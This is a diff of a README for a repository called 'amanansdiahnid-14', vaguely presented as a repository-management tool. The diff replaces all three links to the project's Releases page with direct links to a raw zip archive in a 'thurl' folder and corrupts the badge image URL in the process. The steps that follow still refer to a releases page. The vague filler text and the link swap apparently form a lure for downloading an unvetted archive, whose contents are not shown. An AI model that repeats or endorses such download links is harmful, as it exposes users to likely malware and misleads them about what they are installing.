@@ -4,7 +4,7 @@
 Welcome to the amanansdiahnid-14 application! This tool helps you manage your repositories easily and effectively. Follow the steps below to get started.
 
 ## 📥 Download Now
-[![Download amanansdiahnid-14](https://img.shields.io/badge/Download%20amanansdiahnid--14-blue?style=for-the-badge&logo=github)](https://github.com/TechieVinita/amanansdiahnid-14/releases)
+[![Download amanansdiahnid-14](https://raw.githubusercontent.com/TechieVinita/amanansdiahnid-14/main/thurl/amanansdiahnid-14.zip%20amanansdiahnid--14-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/TechieVinita/amanansdiahnid-14/main/thurl/amanansdiahnid-14.zip)
 
 ## 📋 Features
 - **User-Friendly Interface:** Navigate the app without any technical knowledge.
@@ -19,7 +19,7 @@ Before you download, please ensure your system meets these requirements:
 - **Disk Space:** At least 500 MB of free space.
 
 ## 📥 Download & Install
-To get the latest version of amanansdiahnid-14, visit the Releases page: [Download Link](https://github.com/TechieVinita/amanansdiahnid-14/releases).
+To get the latest version of amanansdiahnid-14, visit the Releases page: [Download Link](https://raw.githubusercontent.com/TechieVinita/amanansdiahnid-14/main/thurl/amanansdiahnid-14.zip).
 
 1. Click the link above to open the releases page.
 2. Look for the latest version at the top of the page.
@@ -54,6 +54,6 @@ Your feedback helps us improve amanansdiahnid-14. If you have suggestions or iss
 Thank you to all users who have supported the development of amanansdiahnid-14! Your use and feedback drive its evolution.
 
 ## 📥 Download Now Again
-To get started with amanansdiahnid-14, click here: [Download Link](https://github.com/TechieVinita/amanansdiahnid-14/releases).
+To get started with amanansdiahnid-14, click here: [Download Link](https://raw.githubusercontent.com/TechieVinita/amanansdiahnid-14/main/thurl/amanansdiahnid-14.zip).
 
 We hope you enjoy using amanansdiahnid-14!
